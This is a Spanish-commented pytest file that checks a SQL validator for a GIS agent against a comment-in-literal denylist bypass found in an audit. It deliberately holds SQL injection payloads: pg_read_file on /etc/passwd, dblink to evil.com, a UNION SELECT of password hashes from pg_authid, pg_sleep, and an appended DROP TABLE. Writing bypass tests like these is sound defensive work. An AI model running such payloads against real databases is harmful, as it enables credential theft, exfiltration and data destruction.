"""R0.7a (auditoría 2026-07-26, AUD-04) — la denylist no se evade con literales.

`_strip_comments` usaba dos regex ciegas a los literales de cadena. En
PostgreSQL un `--` o `/*` DENTRO de comillas simples no abre comentario, así
que todo lo que iba detrás quedaba invisible para la denylist y sí se
ejecutaba. La auditoría lo verificó ejecutando el validador real: los cuatro
payloads de abajo devolvían `is_valid=True`.

ALCANCE: esto cierra el bypass verificado; NO convierte una denylist sobre
texto en un control robusto. El fix de fondo (validar el AST con
sqlglot/pglast) sigue pendiente en R0.7.
"""

from __future__ import annotations

import pytest

from geo_copilot.agents.gis_agent.sql_validator import SQLValidator


@pytest.fixture
def validador():
    return SQLValidator()


class TestBypassPorLiteral:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT '--' , pg_sleep(30) FROM catastro.lotes LIMIT 1",
            "SELECT '/*' AS a, pg_read_file('/etc/passwd') AS b, '*/' AS c LIMIT 1",
            "SELECT '--' , dblink('host=evil.com','SELECT 1') LIMIT 1",
            "SELECT a FROM t WHERE x = '--' UNION SELECT rolpassword FROM pg_authid LIMIT 1",
        ],
    )
    def test_los_cuatro_payloads_verificados_quedan_bloqueados(self, validador, sql):
        assert validador.validate(sql)["is_valid"] is False

    @pytest.mark.parametrize(
        "sql",
        [
            'SELECT "col--rara" FROM lotes LIMIT 1',          # identificador entrecomillado
            "SELECT $$texto -- con guiones$$ FROM lotes LIMIT 1",  # dollar-quoting
            "SELECT 'a''b--c' FROM lotes LIMIT 1",            # comilla escapada
        ],
    )
    def test_las_demas_formas_de_citar_tampoco_ocultan(self, validador, sql):
        # No importa el veredicto; importa que el escaneo no se descarrile y
        # que un DROP escondido detrás siga viéndose.
        peligroso = sql.replace("LIMIT 1", "LIMIT 1; DROP TABLE lotes")
        assert validador.validate(peligroso)["is_valid"] is False


class TestNoRompeLoLegitimo:
    @pytest.mark.parametrize(
        "sql",
        [
            "SELECT id, nombre FROM catastro.lotes LIMIT 100",
            "SELECT ST_AsGeoJSON(ST_Transform(geom,4326)) AS geometry FROM catastro.lotes LIMIT 10",
            "SELECT * FROM lotes WHERE barrio = 'El Centro' LIMIT 50",
            "SELECT count(*) FROM lotes -- conteo total",
            "/* cabecera */ SELECT 1 FROM lotes LIMIT 1",
            "SELECT 'texto con -- guiones' AS t FROM lotes LIMIT 1",
            "SELECT 'O''Brien' AS apellido FROM lotes LIMIT 1",
        ],
    )
    def test_sql_valido_sigue_pasando(self, validador, sql):
        resultado = validador.validate(sql)
        assert resultado["is_valid"] is True, resultado.get("errors")


class TestElStripConservaLosLiterales:
    def test_el_contenido_citado_no_se_borra(self):
        sql = "SELECT '/* no soy comentario */' AS t FROM lotes"
        assert "no soy comentario" in SQLValidator._strip_comments(sql)

    def test_los_comentarios_reales_si_se_borran(self):
        assert "secreto" not in SQLValidator._strip_comments("SELECT 1 /* secreto */ FROM t")
        assert "secreto" not in SQLValidator._strip_comments("SELECT 1 -- secreto\nFROM t")
